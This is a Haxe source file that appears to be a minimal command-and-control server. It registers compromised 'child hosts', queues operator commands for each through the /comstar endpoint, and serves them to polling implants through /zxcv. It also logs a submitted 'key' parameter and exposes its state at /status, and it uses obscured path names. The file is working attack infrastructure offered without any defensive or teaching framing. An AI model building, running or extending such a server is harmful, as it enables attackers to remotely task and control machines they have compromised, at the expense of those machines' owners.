import tink.http.containers.*;
import tink.http.Response;
import tink.Url;
import tink.url.Query;
using tink.CoreApi;

class C2Server {
    static var codes_tables:Map<String, String> = [];
    static var command_tables:Map<String, Array<String>> = [];
    static var result_tables:Map<String, Array<String>> = [];

    static function main() {
        var container = new NodeContainer(8000);
        container.run(function(req) {
            var url:Url = req.header.url;
            Sys.println("req: " + url.path);
            if (req.header.url.path == "/status") {
                return Future.sync((C2Server.statusPath(req):OutgoingResponse));
            } else if (req.header.url.path == "/asdf") {
                return Future.sync((C2Server.asdfPath(req):OutgoingResponse));
            } else if (req.header.url.path == "/qwerty") {
                return Future.sync((C2Server.qwertyPath(req):OutgoingResponse));
            } else if (req.header.url.path == "/zxcv") {
                return Future.sync((C2Server.zxcvPath(req):OutgoingResponse));
            } else if (req.header.url.path == "/comstar") {
                return Future.sync((C2Server.comstarPath(req):OutgoingResponse));
            } else {
                return Future.sync(('Hello, World!':OutgoingResponse));
            }
        });
    }

    static function statusPath(req) {
        return 'code_tables: ${C2Server.codes_tables}\n command_tables: ${C2Server.command_tables}\n';
    }

    static function asdfPath(req) {
        var url:Url = req.header.url;
        var q = url.query.toMap();
        var code = q['code'];

        if (C2Server.command_tables.exists(code)) {
            return 'code already exists!';
        }

        var n = [ for (k in C2Server.codes_tables.keys()) k ].length;
        var id = 'z-${n}';
        C2Server.codes_tables[id] = code;
        C2Server.command_tables[code] = [];
        C2Server.result_tables[code] = [];
        Sys.println('added child host: ${code} => ${C2Server.codes_tables[id]}');

        return 'qwerty: ${C2Server.codes_tables}';
    }

    static function zxcvPath(req) {
        var url:Url = req.header.url;
        var q = url.query.toMap();
        var code = q['code'];

        if (!C2Server.command_tables.exists(code)) {
            return 'code doesnt exists!';
        }

        var coms = C2Server.command_tables[code];
        C2Server.command_tables[code] = [];
        return 'coms: ${coms}';
    }

    static function comstarPath(req) {
        var url:Url = req.header.url;
        var q = url.query.toMap();
        var id = q['id'];
        var com = q['com'];

        if (!C2Server.codes_tables.exists(id)) {
            return 'id doesnt exist';
        }

        C2Server.command_tables[C2Server.codes_tables[id]].push(com);
        return 'batched coms: ${C2Server.command_tables[C2Server.codes_tables[id]]}';
    }

    static function qwertyPath(req) {
        var url:Url = req.header.url;
        var query = url.query;
        if (query != null) {
            var nquery:Query = query;
            var values = nquery.toMap();
            Sys.println("thing: " + values['key']);
        }
        return 'qwerty:';
    }
}




